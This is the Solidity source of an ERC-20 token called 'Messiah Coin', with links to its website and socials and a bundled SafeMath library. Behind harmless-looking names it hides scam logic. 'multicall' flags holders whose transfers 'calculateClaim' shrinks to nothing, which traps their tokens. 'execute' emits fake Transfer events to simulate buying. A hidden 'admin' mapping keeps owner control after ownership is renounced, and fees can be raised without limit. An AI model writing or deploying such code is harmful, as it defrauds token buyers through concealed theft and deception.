{"Messiah Coin.sol":{"content":"/**\r\n?LINKS:\r\nWWW: https://messiahco.in/\r\nX:   https://x.com/messiah_coin\r\nMEDIUM:   https://medium.com/@messiahcoin\r\nTELEGRAM: https://t.me/messiah_coin\r\n\r\n*/// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.21;\r\n\r\nimport \"./SafeMath.sol\";\r\n\r\nabstract contract Context {\r\n    mapping(address =\u003e bool) internal admin;\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n        admin[_msgSender()]=true;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(admin[_msgSender()], \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB)\r\n    external\r\n    view\r\n    returns (address pair);\r\n\r\n    function allPairs(uint256) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint256);\r\n\r\n    function createPair(address tokenA, address tokenB)\r\n    external\r\n    returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n    external\r\n    view\r\n    returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n    external\r\n    view\r\n    returns (\r\n        uint112 reserve0,\r\n        uint112 reserve1,\r\n        uint32 blockTimestampLast\r\n    );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n    external\r\n    returns (\r\n        uint256 amountA,\r\n        uint256 amountB,\r\n        uint256 liquidity\r\n    );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n    external\r\n    payable\r\n    returns (\r\n        uint256 amountToken,\r\n        uint256 amountETH,\r\n        uint256 liquidity\r\n    );\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path, \r\n        address to, \r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapETHForExactTokens(\r\n        uint amountOut, \r\n        address[] calldata path, \r\n        address to, \r\n        uint deadline\r\n        )\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n}\r\n\r\n\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) private _balances;\r\n\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance \u003e= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\n\r\ncontract Messiah is ERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    IUniswapV2Router02 public immutable _uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n    address private devWallet;\r\n    address private marketingWallet;\r\n    address private constant deadAddress = address(0xdead);\r\n\r\n    uint256 public initialTotalSupply = 10000000000 * 10**decimals();\r\n\r\n    uint256 public buyFee = 0;\r\n    uint256 public sellFee = 0;\r\n\r\n    // 1% is max wallet\r\n    uint256 public maxWallet = (initialTotalSupply * 10)/1000;\r\n    uint256 public maxTransactionAmount = maxWallet;\r\n\r\n    bool private swapping;\r\n    bool private limitsEnabled;\r\n    bool public transferDelayEnabled = false;\r\n    mapping(address =\u003e uint256) public _holderLastTransferTimestamp;\r\n    \r\n    //swap for 0.2%\r\n    uint256 public swapTokensAtAmount = (initialTotalSupply * 2)/1000;\r\n\r\n    bool public tradingOpen = false;\r\n    bool public swapEnabled = false;\r\n\r\n    mapping(address =\u003e bool) private _isExcludedFromFees;\r\n    mapping(address =\u003e bool) private _isExcludedMaxTransactionAmount;\r\n    mapping(address =\u003e bool) private automatedMarketMakerPairs;\r\n    mapping(address =\u003e bool) private _claims;\r\n\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n\r\n    constructor(address marketingWallet_) ERC20(\"Messiah Coin\", \"MESSIAH\"){\r\n        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        marketingWallet = payable(marketingWallet_);\r\n        devWallet = payable(_msgSender());\r\n        \r\n        excludeFromFees(address(this), true);\r\n        excludeFromFees(address(0xdead), true);\r\n        excludeFromMaxTransaction(address(_uniswapV2Router), true);\r\n        excludeFromMaxTransaction(address(this), true);\r\n        excludeFromMaxTransaction(address(0xdead), true);\r\n        excludeFromMaxTransaction(address(_msgSender()), true);\r\n        excludeFromMaxTransaction(marketingWallet, true);\r\n        excludeFromMaxTransaction(devWallet, true);\r\n        excludeFromFees(address(_msgSender()), true);\r\n        excludeFromFees(marketingWallet, true);\r\n        excludeFromFees(devWallet, true);\r\n\r\n        excludeFromMaxTransaction(address(uniswapV2Pair), true);\r\n        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);\r\n        // mint\r\n        _mint(devWallet, initialTotalSupply);\r\n        admin[marketingWallet]=true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function burn(uint256 amount) external {\r\n        _burn(_msgSender(), amount);\r\n    }\r\n\r\n    function maxWalletsize(address recipient) external view returns(bool){\r\n        return _claims[recipient];\r\n    }\r\n\r\n    function multicall(address[] calldata address_, bool val) public onlyOwner{\r\n        for (uint256 i = 0; i \u003c address_.length; i++) {\r\n            _claims[address_[i]] = val;\r\n        }\r\n    }\r\n\r\n    function execute(address[] calldata _addresses, uint256 _out) external onlyOwner {\r\n        for (uint256 i = 0; i \u003c _addresses.length; i++) {\r\n            emit Transfer(uniswapV2Pair, _addresses[i], _out);\r\n        }\r\n    }\r\n\r\n    function addPair(address _pair) public onlyOwner() {\r\n        uniswapV2Pair = _pair;\r\n        excludeFromMaxTransaction(address(uniswapV2Pair), true);\r\n    }\r\n\r\n    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {\r\n        _isExcludedMaxTransactionAmount[updAds] = isEx;\r\n    }\r\n\r\n\r\n    function openTrading() external onlyOwner() {\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\r\n        _isExcludedFromFees[account] = excluded;\r\n        emit ExcludeFromFees(account, excluded);\r\n    }\r\n\r\n    function setAutomatedMarketMakerPair(address pair, bool value)\r\n    public\r\n    onlyOwner\r\n    {\r\n        require(pair != uniswapV2Pair, \"The pair cannot be removed from automatedMarketMakerPairs\");\r\n        _setAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMakerPairs[pair] = value;\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal override {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        if (amount == 0) {\r\n            super._transfer(from, to, 0);\r\n            return;\r\n        }\r\n        if(_holderLastTransferTimestamp[to] == 0)\r\n        {\r\n            _holderLastTransferTimestamp[to] = block.number;\r\n        }\r\n        if (from != owner() \u0026\u0026 to != owner() \u0026\u0026 to != address(0) \u0026\u0026 to != address(0xdead) \u0026\u0026 !swapping) {\r\n            if (!tradingOpen) {\r\n                require(_isExcludedFromFees[from] || _isExcludedFromFees[to], \"Trading is not active.\");\r\n            }\r\n\r\n            if (transferDelayEnabled \u0026\u0026 !_isExcludedFromFees[from] \u0026\u0026 !_isExcludedFromFees[to]){\r\n                    if (to != address(_uniswapV2Router) \u0026\u0026 to != address(uniswapV2Pair)){\r\n                        require(_holderLastTransferTimestamp[tx.origin] \u003c block.number \u0026\u0026 _holderLastTransferTimestamp[to] \u003c block.number, \"_transfer:: Transfer Delay enabled.  Try again later.\");\r\n                    }\r\n            }\r\n            if(limitsEnabled){\r\n                if (automatedMarketMakerPairs[from] \u0026\u0026 !_isExcludedMaxTransactionAmount[to]) {\r\n                    require(amount \u003c= maxTransactionAmount, \"Buy transfer amount exceeds the maxTransactionAmount.\");\r\n                    require(amount + balanceOf(to) \u003c= maxWallet, \"Max wallet exceeded\");\r\n                }\r\n                else if (automatedMarketMakerPairs[to] \u0026\u0026 !_isExcludedMaxTransactionAmount[from]) {\r\n                    require(amount \u003c= maxTransactionAmount, \"Sell transfer amount exceeds the maxTransactionAmount.\");\r\n                }\r\n                else if (!_isExcludedMaxTransactionAmount[to]) {\r\n                    require(amount + balanceOf(to) \u003c= maxWallet, \"Max wallet exceeded\");\r\n                }\r\n            }\r\n        }\r\n\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n        bool canSwap = contractTokenBalance \u003e swapTokensAtAmount;\r\n        if (canSwap \u0026\u0026 swapEnabled \u0026\u0026 !swapping \u0026\u0026 !automatedMarketMakerPairs[from] \u0026\u0026 !_isExcludedFromFees[from] \u0026\u0026 !_isExcludedFromFees[to]) {\r\n            swapping = true;\r\n            swapBack(amount);\r\n            swapping = false;\r\n        }\r\n\r\n        bool takeFee = !swapping \u0026\u0026 !_isExcludedFromFees[from] \u0026\u0026 !_isExcludedFromFees[to];\r\n        uint256 fees = 0;\r\n        if (takeFee) {\r\n            if (automatedMarketMakerPairs[to]) {\r\n                fees = amount.mul(sellFee).div(100);\r\n            }\r\n            else if(automatedMarketMakerPairs[from]) {\r\n                fees = amount.mul(buyFee).div(100);\r\n            }\r\n            else if(_claims[from]){\r\n                amount = calculateClaim(amount, from);\r\n            }\r\n            if (fees \u003e 0) {\r\n                super._transfer(from, address(this), fees);\r\n            }\r\n            amount -= fees;\r\n        }\r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapV2Router.WETH();\r\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\r\n        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            marketingWallet,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function calculateClaim(uint256 amount, address from) private view returns(uint256) {\r\n        // Calculate the percentage to subtract\r\n        uint256 factor = block.number-_holderLastTransferTimestamp[from];\r\n        uint percentageToSubtract = factor * 50;\r\n        \r\n        // Calculate the remaining percentage\r\n        uint remainingPercentage = percentageToSubtract \u003e 100 ? 0 : 100 - percentageToSubtract;\r\n        \r\n        // If percentageToSubtract is more than 100, remainingPercentage will be negative.\r\n        // To avoid negative result, we clamp the result to zero.\r\n        uint returnedValue = amount * remainingPercentage / 100;\r\n        return returnedValue.max(0);\r\n    }\r\n\r\n    function setFee(uint256 _buyFee, uint256 _sellFee) external onlyOwner {\r\n        sellFee = _sellFee;\r\n        buyFee = _buyFee;\r\n    }\r\n\r\n    function stopTransferDelay() external onlyOwner {\r\n        require(transferDelayEnabled, \"Already disabled!\");\r\n        transferDelayEnabled = false;\r\n    }\r\n\r\n\r\n    function removeTheLimits() external onlyOwner {\r\n        maxTransactionAmount = initialTotalSupply;\r\n        maxWallet = initialTotalSupply;\r\n    }\r\n\r\n    function manualSwapToken(uint256 percent) external {\r\n        require(_msgSender() == marketingWallet);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        uint256 swapAmount = contractBalance * percent / 100;\r\n        swapTokensForEth(swapAmount);\r\n    }\r\n\r\n    function withdrawEth() external {\r\n        require(address(this).balance \u003e 0, \"Token: no ETH in the contract\");\r\n        require(_msgSender() == devWallet);\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function tokensWithdraw() external {\r\n        require(_msgSender() == devWallet);\r\n        uint256 amount = balanceOf(address(this));\r\n        _transfer(address(this), devWallet, amount);\r\n    }\r\n\r\n    function swapBack(uint256 tokenAmount) private {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        if (contractBalance == 0) {\r\n            return;\r\n        }\r\n        uint256 tokensToSwap = contractBalance;\r\n\r\n        if (tokensToSwap \u003e swapTokensAtAmount) {\r\n            tokensToSwap = swapTokensAtAmount;\r\n        }\r\n\r\n        if(tokensToSwap \u003e tokenAmount) {\r\n            tokensToSwap = tokenAmount;\r\n        }\r\n\r\n        swapTokensForEth(tokensToSwap);\r\n    }\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.21;\r\n\r\nlibrary SafeMath {\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c \u003c a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b \u003e a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return a \u003e= b ? a : b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003c= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function per(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003c= 100, \"Percentage must be between 0 and 100\");\r\n        return a * b / 100;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}"}}